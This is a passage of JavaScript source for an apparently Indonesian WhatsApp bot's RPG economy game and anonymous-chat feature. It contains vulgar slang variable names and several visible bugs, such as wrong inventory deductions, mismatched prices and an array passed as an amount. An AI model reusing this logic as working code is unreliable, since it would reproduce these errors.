if (!q) return setReply('Mau beli apa?\n*Berikut listnya*\n> potion\n> umpan\n> limit')
var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} potion 2\n 1 potion = 100000 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(senderNumber, noh)
var apalu = anu * 1
addPotion(senderNumber, apalu)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(senderNumber)}\n*Potion kamu* : ${getPotion(senderNumber)}`)
}, 2000) 
} else 
if (args[0] === 'umpan'){
let noh = 5000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} umpan 2\n 1 umpan = 2500 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(senderNumber, noh)
var apalu = anu * 1
addUmpan(senderNumber, apalu)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(senderNumber)}\n*Umpan kamu* : ${getUmpan(senderNumber)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} limit 2\n 1 limit = 35000 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(senderNumber, noh)
var apalu = anu * 1
tambahLimit(senderNumber, apalu)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(senderNumber)}\n*Limit kamu* : ${getLimit(senderNumber)}`)
}, 2000) 
} else { setReply("Format salah!") }
}
break
case 'sel': case 'jual':{//BY LORD RIFZA
if (!isRegist) return onlyRegist() 
if (!q) return setReply(`Mau jual apa?\n*Kamu bisa yang ada di list berikut*\n> ikan\n> ayam\n> kelinci\n> domba\n> sapi\n> gajah\n> besi\n> emas\n> emerald`)
if (!isInventoryMonay){ addUserId(gcount, calender, pushname, senderNumber) }
if (!isInventory){ addInventori(senderNumber) }
var anu = args[1]
if (args[0] === 'ikan'){
if (isIkan < anu) return setReply('Ikan kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} ikan 2\n 1 ikan = 1500 monay`)
kurangIkan(senderNumber, anu)
let monaynya = 1500 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Ikan kamu* : ${getIkan(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'ayam'){
if (isAyam < anu) return setReply('Ayam kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} ayam 2\n 1 ayam = 2500 monay`)
kurangAyam(senderNumber, anu)
let monaynya = 2500 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Ayam kamu* : ${getAyam(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'kelinci'){
if (isKelinci < anu) return setReply('Kelinci kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} kelinci 2\n 1 kelinci = 3000 monay`)
kurangKelinci(senderNumber, anu)
let monaynya = 3000 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Kelinci kamu* : ${getKelinci(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'domba'){
if (isDomba < anu) return setReply('Domba kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} domba 2\n 1 domba = 5000 monay`)
kurangDomba(senderNumber, anu)
let monaynya = 5000 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Domba kamu* : ${getDomba(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'sapi'){
if (isSapi < anu) return setReply('Sapi kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} sapi 2\n 1 sapi = 10000 monay`)
kurangSapi(senderNumber, anu)
let monaynya = 10000 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Sapi kamu* : ${getSapi(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'gajah'){
if (isGajah < anu) return setReply('Gajah kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} gajah 2\n 1 gajah = 15000 monay`)
kurangSapi(senderNumber, anu)
let monaynya = 15000 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Gajah kamu* : ${getGajah(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'besi'){
if (isBesi < anu) return setReply('Besi kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} besi 2\n 1 besi = 15000 monay`)
kurangBesi(senderNumber, anu)
let monaynya = 16000 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Besi kamu* : ${getBesi(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'emas'){
if (isEmas < anu) return setReply('Emas kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} emas 2\n 1 emas = 50000 monay`)
kurangEmas(senderNumber, anu)
let monaynya = 50000 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa emas kamu* : ${getEmas(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'emerald'){
if (isEmerald < anu) return setReply('Emerald kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} emerald 2\n 1 emerald = 100000 monay`)
kurangEmerald(senderNumber, anu)
let monaynya = 100000 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa emerald kamu* : ${getEmerald(senderNumber)}`)
}, 2000) 
} else { setReply("Format salah!") }
}
break
case 'heal':{
if (!isRegist) return onlyRegist() 
if (!isCekDarah < 1) return setReply('Kamu hanya bisa heal ketika darah kamu 0')
if (isCekDarah > 100) return setReply('Darah kamu sudah penuh')
if (isPotion < 1) return setReply('Kamu tidak punya potion, cobalah beli dengan cara #buypotion _jumlah_') 
addDarah(senderNumber, 100)
kurangPotion(senderNumber, 1)
setReply('Berhasil, darah kamu sudah full')
}
break
case 'berburu':{
if (!isRegist) return onlyRegist() 
if (!isInventory){ addInventori(senderNumber) }
if (!isDarah){ addInventoriDarah(senderNumber, DarahAwal) }
if (isCekDarah < 1) return setReply('Darah kamu habis, cobalah heal menggunakan potion') 
let luka = ["Tertusuk duri saat berburu","Terpeleset ke jurang saat berburu","Tercakar hewan buas","Tidak berhati-hati","Terjerat akar","Terjatuh saat berburu"]
let location = ["Hutan rimba","Hutan Amazon","Hutan tropis","Padang rumput","Hutan afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]    
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
if (lokasinya === 'Hutan rimba') {
var image = 'https://a.top4top.io/p_2421d8t1f0.jpg'
} else
if (lokasinya === 'Hutan Amazon') {
var image =  'https://g.top4top.io/p_2421u4b8v0.jpg'
} else
if (lokasinya === 'Hutan tropis') {
var image = 'https://c.top4top.io/p_2421841ly2.jpg'
} else
if (lokasinya === 'Padang rumput') {
var image = 'https://e.top4top.io/p_24219narg1.jpg'
} else
if (lokasinya === 'Hutan afrika') {
var image = 'https://i.top4top.io/p_2421gd2zu0.jpg'
} else
if (lokasinya === 'Pegunungan') {
var image = 'https://f.top4top.io/p_242149ec22.jpg'
}
setTimeout( () => {
let teksehmazeh = `_[ HASIL BURUAN ]_\n`
teksehmazeh += `*🐟Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔Ayam* : ${ayam}\n`
teksehmazeh += `*🐇Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑Domba* : ${domba}\n`
teksehmazeh += `*🐄Sapi* : ${sapi}\n`
teksehmazeh += `*🐘Gajah* : ${gajah}\n\n`
teksehmazeh += `_[ INFO ]_\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Terluka* : ${lukanya}, darah - 10\n`
teksehmazeh += `*Sisa darah* : ${getDarah(senderNumber)}\n`
let buttons = [
{buttonId: `${prefix + command}`,buttonText: {displayText: 'Berburu lagi️🏹'}, type: 1},
{buttonId: `${prefix}inventori`,buttonText: {displayText: 'inventori📦'}, type: 1}]
atak.sendMessage(from, { image: { url: image }, buttons, caption: teksehmazeh, fake }, { quoted: ridho })
}, 5000)  
setTimeout( () => {
setReply(`${senderNumber} Mulai berburu di ${lokasinya}`)
}, 1000) 
addIkan(senderNumber, ikanmu) 
addAyam(senderNumber, ayam) 
addKelinci(senderNumber, kelinci)
addDomba(senderNumber, domba)
addSapi(senderNumber, sapi)
addGajah(senderNumber, gajah)
kurangDarah(senderNumber, 10)
}
break
case 'inventori':{
if (!isRegist) return onlyRegist() 
if (!isDarah){ addInventoriDarah(senderNumber, DarahAwal) }
if (!isInventory){ addInventori(senderNumber) }
let teksehmazeh = `_[ 👩🏻‍💼INFO USER👨🏻‍💼 ]_\n\n`
teksehmazeh += `*❤️Darah kamu* : ${getDarah(senderNumber)}\n`
teksehmazeh += `*◻️️Besi kamu* : ${getBesi(senderNumber)}\n`
teksehmazeh += `*🌟Emas Kamu* : ${getEmas(senderNumber)}\n`
teksehmazeh += `*💎Emerald Kamu* : ${getEmerald(senderNumber)}\n`
teksehmazeh += `*⏺️Limit kamu* : ${getLimit(senderNumber)}\n`
teksehmazeh += `*🧪Potion Kamu* : ${getPotion(senderNumber)}\n\n`
teksehmazeh += `_[ 🐺HASIL BURUAN🐺 ]_\n`
teksehmazeh += `*🐟Ikan* : ${getIkan(senderNumber)}\n`
teksehmazeh += `*🐔Ayam* : ${getAyam(senderNumber)}\n`
teksehmazeh += `*🐇Kelinci* : ${getKelinci(senderNumber)}\n`
teksehmazeh += `*🐑Domba* : ${getDomba(senderNumber)}\n`
teksehmazeh += `*🐄Sapi* : ${getSapi(senderNumber)}\n`
teksehmazeh += `*🐘Gajah* : ${getGajah(senderNumber)}\n\n`
teksehmazeh += `_*${botName}*_`  
setReply(teksehmazeh)
}
break
case 'mancing':{
if (!isRegist) return onlyRegist() 
if (!isInventory){ addInventori(senderNumber) }
if (isUmpan < 1) return setReply('Umpan kamu habis!, cobalah berburu dan ubah dagingnya menjadi umpan')
setReply("1 umpan terpakai")
var ikannya = ikan[Math.floor(Math.random() * ikan.length)]
var ditangkap = Math.ceil(Math.random() * 20)
setTimeout( () => {
let caption = `Hasil tangkapan : ${ikannya}\n> Jumlah tangkapan : ${ditangkap}`
let buttons = [
{buttonId: `${prefix + command}`, buttonText: {displayText: 'Mancing lagi🎣'}, type: 1},
{buttonId: `${prefix}inventori`,buttonText: {displayText: 'inventori📦'}, type: 1}]
let buttonMessage = {
image: { url: 'https://d.top4top.io/p_2421jua0j0.jpg' },
caption: caption,
footer: fake,
buttons: buttons,
headerType: 4
}
atak.sendMessage(from, buttonMessage, { quoted: setQuoted })   
}, 7000)  
setTimeout( () => {
setReply(`${senderNumber} Mulai memancing🎣`)     
}, 1500)
kurangUmpan(senderNumber, 1)
addIkan(senderNumber, ditangkap)	     
}   
break  
case 'darah':{
if (!isRegist) return onlyRegist() 
if (!isDarah){ addInventoriDarah(senderNumber, DarahAwal) }
let dapat =  getDarah(senderNumber)
setReply(`${dapat}`)
}
break
case 'goreng':{
if (!args[0]) return setReply("goreng apa kak\n 1.ikan\n 2.ayam\n 3.kelinci\n 4.domba\n 5.sapi\n 6.gajah")
if (!args[1]) return setReply("jumlahnya?")
if (args[1] === "1" || args[1] === "2" || args[1] === "3" || args[1] === "4" || args[1] === "5" || args[1] === "6" || args[1] === "7" || args[1] === "8" || args[1] === "9") return setReply("minimal 10 kak")
if (args[0] === "ikan" && args[1]) {
if (getIkan(senderNumber) < 10) return setReply("Anda tidak memeliki cukup ikan") 
let kontolGoreng = [1,2,3,4,5,6,7,8,9,10]
let memekGoreng = pickRandom(kontolGoreng) 
let anu = args[1]
let ana = anu -= memekGoreng
kurangIkan(senderNumber, anu)
addIkanGoreng(senderNumber, memekGoreng)
for (let i = 0; i < memekGoreng; i++) {
setReply(`berhasil menggoreng ikan ${i+1}`) 
}
setReply(`ikan goreng anda saat ini ${getIkanGoreng(senderNumber)}\n[ HASIL GORRNG ] \n matang : ${memekGoreng} \n gosong : ${ana}`) 
} else if (args[0] === "ayam" && args[1]) {
if (getAyam(senderNumber) < 10) return setReply("Anda tidak memeliki cukup ayam")
let kontolGoreng = [1,2,3,4,5,6,7,8,9,10]
let memekGoreng = pickRandom(kontolGoreng) 
let anu = args[1]
let ana = anu -= memekGoreng
kurangAyam(senderNumber, anu)
addAyamGoreng(senderNumber, memekGoreng) 
for (let i = 0; i < memekGoreng; i++) {
setReply(`berhasil menggoreng ayam ${i+1}`) 
}
setReply(`ayam goreng anda saat ini ${getAyamGoreng(senderNumber)}\n[ HASIL GORRNG ] \n matang : ${memekGoreng} \n gosong : ${ana}`) 
} else if (args[0] === "kelinci" && args[1]) {
if (getKelinci(senderNumber) < 10) return setReply("Anda tidak memeliki cukup kelinci")
let kontolGoreng = [1,2,3,4,5,6,7,8,9,10]
let memekGoreng = pickRandom(kontolGoreng) 
let anu = args[1]
let ana = anu -= memekGoreng
kurangKelinci(senderNumber, anu)
addKelinciGoreng(senderNumber, memekGoreng) 
for (let i = 0; i < memekGoreng; i++) {
setReply(`berhasil menggoreng kelinci ${i+1}`) 
}
setReply(`kelinci goreng anda saat ini ${getKelinciGoreng(senderNumber)}\n[ HASIL GORRNG ] \n matang : ${memekGoreng} \n gosong : ${ana}`) 
} else if (args[0] === "domba" && args[1]) {
if (getDomba(senderNumber) < 10) return setReply("Anda tidak memeliki cukup domba")
let kontolGoreng = [1,2,3,4,5,6,7,8,9,10]
let memekGoreng = pickRandom(kontolGoreng) 
let anu = args[1]
let ana = anu -= memekGoreng
kurangDomba(senderNumber, anu)
addDombaGoreng(senderNumber, memekGoreng) 
for (let i = 0; i < memekGoreng; i++) {
setReply(`berhasil menggoreng domba ${i+1}`) 
}
setReply(`domba goreng anda saat ini ${getDombaGoreng(senderNumber)}\n[ HASIL GORRNG ] \n matang : ${memekGoreng} \n gosong : ${ana}`) 
} else if (args[0] === "sapi" && args[1]) {
if (getSapi(senderNumber) < 10) return setReply("Anda tidak memeliki cukup sapi")
let kontolGoreng = [1,2,3,4,5,6,7,8,9,10]
let memekGoreng = pickRandom(kontolGoreng) 
let anu = args[1]
let ana = anu -= memekGoreng
kurangSapi(senderNumber, anu)
addSapiGoreng(senderNumber, memekGoreng) 
for (let i = 0; i < memekGoreng; i++) {
setReply(`berhasil menggoreng sapi ${i+1}`) 
}
setReply(`sapi goreng anda saat ini ${getSapiGoreng(senderNumber)}\n[ HASIL GORRNG ] \n matang : ${memekGoreng} \n gosong : ${ana}`) 
} else if (args[0] === "gajah" && args[1]) {
if (getGajah(senderNumber) < 10) return setReply("Anda tidak memeliki cukup gajah")
let kontolGoreng = [1,2,3,4,5,6,7,8,9,10]
let memekGoreng = pickRandom(kontolGoreng) 
let anu = args[1]
let ana = anu -= memekGoreng
kurangGajah(senderNumber, anu)
addGajahGoreng(senderNumber, memekGoreng) 
for (let i = 0; i < memekGoreng; i++) {
setReply(`berhasil menggoreng gajah ${i+1}`) 
}
setReply(`gajah goreng anda saat ini ${getGajahGoreng(senderNumber)}\n[ HASIL GORRNG ] \n matang : ${memekGoreng} \n gosong : ${ana}`) 
}
}
break
case 'tukar':
if (!q) return setReply("tukar apa kak\n 1.ikan\n 2.ayam\n 3.kelinci\n 4.domba\n 5.sapi\n 6.gajah")
if (args[0] === "ikan" && args[1]) {
if (getIkanGoreng(senderNumber) < 1) return setReply("Anda tidak memeliki cukup ikan goreng")
kurangIkanGoreng(senderNumber, args[1]) 
tambahLimit(senderNumber, args[1])
setReply(`berhasil menukar ${args[0]} goreng : ${args[1]} menjadi limit : ${args[1]}\n sisa ${args[0]} goreng : ${getIkanGoreng(senderNumber)}\n sisa limit anda ${getLimit(senderNumber)}`) 
} else if (args[0] === "ayam" && args[1]) {
if (getAyamGoreng(senderNumber) < 1) return setReply("Anda tidak memeliki cukup ayam goreng")
kurangAyamGoreng(senderNumber, args[1])
tambahLimit(senderNumber, args[1])
setReply(`berhasil menukar ${args[0]} goreng : ${args[1]} menjadi limit : ${args[1]}\n sisa ${args[0]} goreng : ${getAyamGoreng(senderNumber)}\n sisa limit anda ${getLimit(senderNumber)}`) 
} else if (args[0] === "kelinci" && args[1]) {
if (getKelinciGoreng(senderNumber) < 1) return setReply("Anda tidak memeliki cukup ayam goreng")
kurangKelinciGoreng(senderNumber, args[1])
tambahLimit(senderNumber, args[1])
setReply(`berhasil menukar ${args[0]} goreng : ${args[1]} menjadi limit : ${args[1]}\n sisa ${args[0]} goreng : ${getKelinciGoreng(senderNumber)}\n sisa limit anda ${getLimit(senderNumber)}`) 
} else if (args[0] === "domba" && args[1]) {
if (getDombaGoreng(senderNumber) < 1) return setReply("Anda tidak memeliki cukup ayam goreng")
kurangDombaGoreng(senderNumber, args[1])
tambahLimit(senderNumber, args[1])
setReply(`berhasil menukar ${args[0]} goreng : ${args[1]} menjadi limit : ${args[1]}\n sisa ${args[0]} goreng : ${getDombaGoreng(senderNumber)}\n sisa limit anda ${getLimit(senderNumber)}`) 
} else if (args[0] === "sapi" && args[1]) {
if (getSapiGoreng(senderNumber) < 1) return setReply("Anda tidak memeliki cukup ayam goreng")
kurangSapiGoreng(senderNumber, args[1])
tambahLimit(senderNumber, args[1])
setReply(`berhasil menukar ${args[0]} goreng : ${args[1]} menjadi limit : ${args[1]}\n sisa ${args[0]} goreng : ${getSapiGoreng(senderNumber)}\n sisa limit anda ${getLimit(senderNumber)}`) 
} else if (args[0] === "gajah" && args[1]) {
if (getGajahGoreng(senderNumber) < 1) return setReply("Anda tidak memeliki cukup ayam goreng")
kurangGajahGoreng(senderNumber, args[1])
tambahLimit(senderNumber, args[1])
setReply(`berhasil menukar ${args[0]} goreng : ${args[1]} menjadi limit : ${args[1]}\n sisa ${args[0]} goreng : ${getGajahGoreng(senderNumber)}\n sisa limit anda ${getLimit(senderNumber)}`) 
}
break
case 'nyopet':
case 'merampok':
case 'maling':{
let memek = ["memek1","memek7","memek5","memek6","memek2","memek7","memek2","memek3","memek4","memek5","memek6","memek2","memek3","memek4","memek3","memek4","memek7","memek5","memek6","memek5","memek6","memek7"]
let nyopet1 = [100,150,100,200,100,250,500,100,200,300,400,500,100,350,100,200,400,600,300,100,200,450,100,200,500,100,550,300,400,100,200,600,100,650,100,200,700,300,100,750,100,200,800,100,300,850,100,200,900,100,950,400,300,100,200,1000]
let nyopet2 = [100,300,400,100,200,200,150,150,200,250,300,100,250,150,150,800,700,650,550,500,500,400,400,350,350,900,200,300,100,100,100,400,200,200,500,100,400,800,200,700,550,650,300,350,100,150,150,400,300,250,600,400,350,200,250,1000]
let nyopet3 = [1,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,1]
let rampok1 = pickRandom(nyopet1) 
let rampok2 = pickRandom(nyopet2) 
let rampok3 = pickRandom(nyopet3) 
let memeknya = pickRandom(memek) 
let randomidUser = pickRandom(user) 
let noUsernya = randomidUser.id
if (memeknya === 'memek1') {
if (getBalance(noUsernya) < `${rampok1}`) return setRepl("user tersebut tidak mememiliki cukup saldo\nHarap coba lagi dan nyari user lain")
if (getMonay(noUsernya) < `${rampok2}`) return setRepl("user tersebut tidak mememiliki cukup monay\nHarap coba lagi dan nyari user lain")
if (getLimit(noUsernya) < 1) return setRepl("user tersebut tidak mememiliki cukup limit\nHarap coba lagi dan nyari user lain")
kurangBalance(noUsernya, rampok1)
kurangMonay(noUsernya, nyopet2)
kurangLimit(noUsernya, rampok3)
addBalance(senderNumber, rampok1)
addMonay(senderNumber, nyopet2)
tambahLimit(senderNumber, rampok3)
let teksehmazeh = `[ INFO MERAMPOK ]\n\n`
teksehmazeh += `Berhasil merampok saldo\n`
teksehmazeh += `Berhasil merampok monay\n`
teksehmazeh += `Berhasil merampok limit\n\n`
teksehmazeh += `[ HASIL PENDAPATAN ]\n\n`
teksehmazeh += `saldo : ${rampok1}\n`
teksehmazeh += `monay : ${rampok2}\n`
teksehmazeh += `limit : ${rampok3}\n`
teksehmazeh += `nomer : ${noUsernya}\n\n`
teksehmazeh += `[ HASIL MERAMPOK ]\n\n`
teksehmazeh += `saldo : ${getBalance(senderNumber)}\n`
teksehmazeh += `monay : ${getMonay(senderNumber)}\n`
teksehmazeh += `limit : ${getLimit(senderNumber)}\n`
teksehmazeh += `nomer : ${senderNumber}\n\n`
setReply(teksehmazeh)
} else if (memeknya === 'memek2') {
if (getBalance(noUsernya) < `${rampok1}`) return setRepl("user tersebut tidak mememiliki cukup saldo\nHarap coba lagi dan nyari user lain")
if (getMonay(noUsernya) < `${rampok2}`) return setRepl("user tersebut tidak mememiliki cukup monay\nHarap coba lagi dan nyari user lain")
kurangBalance(noUsernya, rampok1)
kurangMonay(noUsernya, nyopet2)
addBalance(senderNumber, rampok1)
addMonay(senderNumber, nyopet2)
let teksehmazeh = `[ INFO MERAMPOK ]\n\n`
teksehmazeh += `Berhasil merampok saldo\n`
teksehmazeh += `Berhasil merampok monay\n\n`
teksehmazeh += `[ HASIL PENDAPATAN ]\n\n`
teksehmazeh += `saldo : ${rampok1}\n`
teksehmazeh += `monay : ${rampok2}\n`
teksehmazeh += `nomer : ${noUsernya}\n\n`
teksehmazeh += `[ HASIL MERAMPOK ]\n\n`
teksehmazeh += `saldo : ${getBalance(senderNumber)}\n`
teksehmazeh += `monay : ${getMonay(senderNumber)}\n`
teksehmazeh += `nomer : ${senderNumber}\n\n`
setReply(teksehmazeh)
} else if (memeknya === 'memek3') {
if (getMonay(noUsernya) < `${rampok2}`) return setRepl("user tersebut tidak mememiliki cukup monay\nHarap coba lagi dan nyari user lain")
if (getLimit(noUsernya) < 1) return setRepl("user tersebut tidak mememiliki cukup limit\nHarap coba lagi dan nyari user lain")
kurangMonay(noUsernya, nyopet2)
kurangLimit(noUsernya, rampok3)
addMonay(senderNumber, nyopet2)
tambahLimit(senderNumber, rampok3)
let teksehmazeh = `[ INFO MERAMPOK ]\n\n`
teksehmazeh += `Berhasil merampok monay\n`
teksehmazeh += `Berhasil merampok limit\n\n`
teksehmazeh += `[ HASIL PENDAPATAN ]\n\n`
teksehmazeh += `monay : ${rampok2}\n`
teksehmazeh += `limit : ${rampok3}\n`
teksehmazeh += `nomer : ${noUsernya}\n\n`
teksehmazeh += `[ HASIL MERAMPOK ]\n\n`
teksehmazeh += `monay : ${getMonay(senderNumber)}\n`
teksehmazeh += `limit : ${getLimit(senderNumber)}\n`
teksehmazeh += `nomer : ${senderNumber}\n\n`
setReply(teksehmazeh)
} else if (memeknya === 'memek4') {
if (getBalance(noUsernya) < `${rampok1}`) return setRepl("user tersebut tidak mememiliki cukup saldo\nHarap coba lagi dan nyari user lain")
if (getLimit(noUsernya) < 1) return setRepl("user tersebut tidak mememiliki cukup limit\nHarap coba lagi dan nyari user lain")
kurangBalance(noUsernya, rampok1)
kurangLimit(noUsernya, rampok3)
addBalance(senderNumber, rampok1)
tambahLimit(senderNumber, rampok3)
let teksehmazeh = `[ INFO MERAMPOK ]\n\n`
teksehmazeh += `Berhasil merampok saldo\n`
teksehmazeh += `Berhasil merampok limit\n\n`
teksehmazeh += `[ HASIL PENDAPATAN ]\n\n`
teksehmazeh += `saldo : ${rampok1}\n`
teksehmazeh += `limit : ${rampok3}\n`
teksehmazeh += `nomer : ${noUsernya}\n\n`
teksehmazeh += `[ HASIL MERAMPOK ]\n\n`
teksehmazeh += `saldo : ${getBalance(senderNumber)}\n`
teksehmazeh += `limit : ${getLimit(senderNumber)}\n`
teksehmazeh += `nomer : ${senderNumber}\n\n`
setReply(teksehmazeh)
} else if (memeknya === 'memek5') {
if (getBalance(noUsernya) < `${rampok1}`) return setRepl("user tersebut tidak mememiliki cukup saldo\nHarap coba lagi dan nyari user lain")
kurangBalance(noUsernya, rampok1)
addBalance(senderNumber, rampok1)
let teksehmazeh = `[ INFO MERAMPOK ]\n\n`
teksehmazeh += `Berhasil merampok saldo\n\n`
teksehmazeh += `[ HASIL PENDAPATAN ]\n\n`
teksehmazeh += `saldo : ${rampok1}\n`
teksehmazeh += `nomer : ${noUsernya}\n\n`
teksehmazeh += `[ HASIL MERAMPOK ]\n\n`
teksehmazeh += `saldo : ${getBalance(senderNumber)}\n`
teksehmazeh += `nomer : ${senderNumber}\n\n`
setReply(teksehmazeh)
} else if (memeknya === 'memek6') {
if (getMonay(noUsernya) < `${rampok2}`) return setRepl("user tersebut tidak mememiliki cukup monay\nHarap coba lagi dan nyari user lain")
kurangMonay(noUsernya, nyopet2)
addMonay(senderNumber, nyopet2)
let teksehmazeh = `[ INFO MERAMPOK ]\n\n`
teksehmazeh += `Berhasil merampok monay\n\n`
teksehmazeh += `[ HASIL PENDAPATAN ]\n\n`
teksehmazeh += `monay : ${rampok2}\n`
teksehmazeh += `nomer : ${noUsernya}\n\n`
teksehmazeh += `[ HASIL MERAMPOK ]\n\n`
teksehmazeh += `monay : ${getMonay(senderNumber)}\n`
teksehmazeh += `nomer : ${senderNumber}\n\n`
setReply(teksehmazeh)
} else if (memeknya === 'memek7') {
if (getLimit(noUsernya) < 1) return setRepl("user tersebut tidak mememiliki cukup limit\nHarap coba lagi dan nyari user lain")
kurangLimit(noUsernya, rampok3)
tambahLimit(senderNumber, rampok3)
let teksehmazeh = `[ INFO MERAMPOK ]\n\n`
teksehmazeh += `Berhasil merampok limit\n\n`
teksehmazeh += `[ HASIL PENDAPATAN ]\n\n`
teksehmazeh += `limit : ${rampok3}\n`
teksehmazeh += `nomer : ${noUsernya}\n\n`
teksehmazeh += `[ HASIL MERAMPOK ]\n\n`
teksehmazeh += `limit : ${getLimit(senderNumber)}\n`
teksehmazeh += `nomer : ${senderNumber}\n\n`
setReply(teksehmazeh)
} 
}
break
//================================================================================\\
case 'anonymous':{
if (!isRegist) return onlyRegist()
if(isGroup) return setReply("Tidak bisa di gunakan di dalam group")
let teks =`
Anonymous Chat adalah
fitur yang memungkinkan kamu
berinteraksi dengan user lain
tanpa mengetahui identitas 
dan terintegrasi secara acak.

Klik start untuk memulai`

let mok = [
{"buttonId": `${prefix}start`,"buttonText": {"displayText": `START`},"type": "RESPONSE"},
{"buttonId": `${prefix}keluar`,"buttonText": {"displayText": `KELUAR`},"type": "RESPONSE"}]
atak.sendButLoc(from, teks,fake,fs.readFileSync('./media/image/anonymous.jpg'), mok)
}
break
case 'start': {
if (!isRegist) return onlyRegist()
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
if (roomA || roomB ) return setReply("Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu")
if (room) {
await atak.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await atak.sendMessage(room.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`}) 
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired: Date.now() + toMs("5m")
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`)
}
}
break
case 'startchat': {
if (!isRegist) return onlyRegist()
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
if(!q) return setReply("Masukan nomer target yang mau di chat")
if (roomA || roomB ) return setReply("Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu")
let id = + new Date
const obj = {
id,
a: m.sender,
b: Input,
state: "CHATTING",
expired: "INFINITY"
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room anonymous\nDan menjadikan ${Input} sebagai partner mu\nSekarang kamu bisa mengirim pesan`)
}
break
case 'stop':
case 'keluar': {
if (!isRegist) return onlyRegist()
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
if(roomA && roomA.state == "CHATTING"){
await atak.sendMessage(roomA.b, {text:"Partnermu telah meninggalkan room anonymous"})
await setTimeout(() => {
setReply("Kamu telah keluar dari room anonymous")
roomA.a = roomA.b
roomA.b = ""
